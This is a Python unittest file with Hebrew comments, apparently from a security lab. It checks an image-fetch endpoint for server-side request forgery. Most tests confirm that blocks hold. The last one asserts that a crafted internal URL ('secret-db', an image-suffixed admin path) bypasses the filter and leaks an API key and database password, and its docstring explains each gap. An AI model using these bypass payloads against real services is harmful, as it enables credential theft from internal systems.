import unittest
import requests


class TestSSRFExploit(unittest.TestCase):
    BASE_URL = 'http://localhost:5000'

    def test_old_attack_is_blocked(self):
        """מוכיח שהמתקפה הישנה (hostname ישיר) נחסמת על ידי ההגנות החדשות"""
        exploit_url = f"{self.BASE_URL}/api/fetch?url=http://internal-app:8080/admin/secrets%23.png"

        try:
            response = requests.get(exploit_url)
            self.assertIn("blacklisted", response.text.lower(),
                          "המתקפה הישנה לא נחסמה - ההגנה על hostname לא עובדת!")
            self.assertNotIn("AKIA-SECRET-KEY", response.text,
                             "הסודות הודלפו! המתקפה הישנה עדיין עובדת!")
        except Exception as e:
            self.fail(f"שגיאת תקשורת: {e}")

    def test_direct_ip_is_blocked(self):
        """מוכיח שגישה ישירה עם IP פרטי נחסמת"""
        exploit_url = f"{self.BASE_URL}/api/fetch?url=http://127.0.0.1:8080/admin/secrets/logo.png"

        try:
            response = requests.get(exploit_url)
            self.assertIn("Security Block", response.text,
                          "גישה ישירה ל-127.0.0.1 לא נחסמה!")
        except Exception as e:
            self.fail(f"שגיאת תקשורת: {e}")

    def test_path_without_extension_is_blocked(self):
        """מוכיח שנתיב ללא סיומת תמונה נחסם (גם אם ה-hostname עובר)"""
        exploit_url = f"{self.BASE_URL}/api/fetch?url=http://secret-db:8080/admin/secrets"

        try:
            response = requests.get(exploit_url)
            self.assertIn("image extension", response.text.lower(),
                          "נתיב ללא סיומת תמונה לא נחסם!")
        except Exception as e:
            self.fail(f"שגיאת תקשורת: {e}")

    def test_advanced_ssrf_bypass_succeeds(self):
        """
        מוכיח שהמתקפה המתוחכמת עוקפת את כל 10 ההגנות:
        - secret-db: שם DNS שלא ברשימה השחורה
        - IP 172.x.x.x: טווח Docker שלא חסום (חסר 172.16.0.0/12!)
        - /admin/secrets/logo.png: נתיב שמסתיים בסיומת תמונה
        - Content-Type: רק מתועד בלוג, לא נחסם
        """
        exploit_url = (
            f"{self.BASE_URL}/api/fetch"
            f"?url=http://secret-db:8080/admin/secrets/logo.png"
        )

        try:
            response = requests.get(exploit_url)
            self.assertIn("AKIA-SECRET-KEY", response.text,
                          "המתקפה המתוחכמת נכשלה: מפתח ה-API לא נמצא!")
            self.assertIn("db_password", response.text,
                          "המתקפה המתוחכמת נכשלה: סיסמת ה-DB לא נמצאה!")
        except Exception as e:
            self.fail(f"שגיאת תקשורת: {e}")
